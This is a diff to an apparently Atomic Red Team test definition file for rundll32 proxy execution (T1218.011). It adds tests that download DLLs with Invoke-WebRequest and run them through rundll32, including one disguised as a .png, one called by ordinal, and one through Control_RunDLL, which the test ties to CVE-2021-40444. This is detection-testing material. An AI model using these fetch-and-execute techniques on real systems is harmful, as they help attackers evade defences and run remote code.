@@ -27,7 +27,7 @@ atomic_tests:
   input_arguments:
     command_to_execute:
       description: Command for rundll32.exe to execute
-      type: string
+      type: String
       default: calc.exe
   executor:
     command: |
@@ -44,7 +44,7 @@ atomic_tests:
   input_arguments:
     inf_to_execute:
       description: Local location of inf file
-      type: string
+      type: String
       default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
   dependency_executor_name: powershell
   dependencies:
@@ -71,7 +71,7 @@ atomic_tests:
   input_arguments:
     inf_to_execute:
       description: Local location of inf file
-      type: string
+      type: String
       default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
   dependency_executor_name: powershell
   dependencies:
@@ -97,7 +97,7 @@ atomic_tests:
   input_arguments:
     inf_to_execute:
       description: Local location of inf file
-      type: string
+      type: String
       default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
   dependency_executor_name: powershell
   dependencies:
@@ -112,7 +112,6 @@ atomic_tests:
     command: |
       rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\#{inf_to_execute}
     name: command_prompt
-
 - name: Rundll32 setupapi.dll Execution
   auto_generated_guid: 71d771cd-d6b3-4f34-bc76-a63d47a10b19
   description: |
@@ -124,7 +123,7 @@ atomic_tests:
   input_arguments:
     inf_to_execute:
       description: Local location of inf file
-      type: string
+      type: String
       default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
   dependency_executor_name: powershell
   dependencies:
@@ -139,7 +138,6 @@ atomic_tests:
     command: |
       rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\#{inf_to_execute}
     name: command_prompt
-
 - name: Execution of HTA and VBS Files using Rundll32 and URL.dll
   auto_generated_guid: 22cfde89-befe-4e15-9753-47306b37a6e3
   description: |
@@ -156,7 +154,6 @@ atomic_tests:
       rundll32.exe url.dll,OpenURL PathToAtomicsFolder\T1218.011\src\index.hta
       rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\T1218.011\src\akteullen.vbs
     name: command_prompt
-
 - name: Launches an executable using Rundll32 and pcwutl.dll
   auto_generated_guid: 9f5d081a-ee5a-42f9-a04e-b7bdc487e676
   description: |
@@ -166,9 +163,91 @@ atomic_tests:
   input_arguments:
     exe_to_launch:
       description: Path of the executable to launch
-      type: path
+      type: Path
       default: '%windir%\System32\notepad.exe'
   executor:
     command: |
       rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
     name: command_prompt
+- name: Execution of non-dll using rundll32.exe
+  auto_generated_guid: ae3a8605-b26e-457c-b6b3-2702fd335bac
+  description: |
+    Rundll32.exe running non-dll 
+  supported_platforms:
+      - windows
+  input_arguments:
+    input_url:
+      description: Url to download the DLL
+      type: Url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+    input_file:
+      description: Non-dll file
+      type: String
+      default: C:\Users\$env:username\Downloads\calc.png
+  dependency_executor_name: powershell 
+  dependencies: 
+  - description: |
+      Non-dll file must exist on disk at specified location
+    prereq_command: | 
+      if (Test-Path #{input_file}) {exit 0} else {exit 1}
+    get_prereq_command: | 
+      Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+  executor:
+    name: powershell
+    command: | 
+      rundll32.exe #{input_file}, StartW
+- name: Rundll32 with Ordinal Value
+  auto_generated_guid: 9fd5a74b-ba89-482a-8a3e-a5feaa3697b0
+  description: |
+    Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. 
+    Upon successful execution, Calc.exe will spawn.
+  supported_platforms:
+      - windows
+  input_arguments:
+    input_url:
+      description: Url to download the DLL
+      type: Url
+      default: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll
+    input_file:
+      description: DLL File
+      type: String
+      default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx64.dll
+  dependency_executor_name: powershell 
+  dependencies: 
+  - description: |
+      DLL file must exist on disk at specified location
+    prereq_command: | 
+      if (Test-Path #{input_file}) {exit 0} else {exit 1}
+    get_prereq_command: | 
+      Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+  executor:
+    name: command_prompt
+    command: | 
+      rundll32.exe #{input_file},#2
+- name: Rundll32 with Control_RunDLL
+  auto_generated_guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
+  description: |
+    Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. 
+  supported_platforms:
+      - windows
+  input_arguments:
+    input_url:
+      description: Url to download the DLL
+      type: Url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+    input_file:
+      description: DLL File
+      type: String
+      default: PathToAtomicsFolder\T1047\bin\calc.dll
+  dependency_executor_name: powershell 
+  dependencies: 
+  - description: |
+      DLL file must exist on disk at specified location
+    prereq_command: | 
+      if (Test-Path #{input_file}) {exit 0} else {exit 1}
+    get_prereq_command: | 
+      Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+  executor:
+    name: command_prompt
+    command: | 
+      rundll32.exe shell32.dll,Control_RunDLL #{input_file}
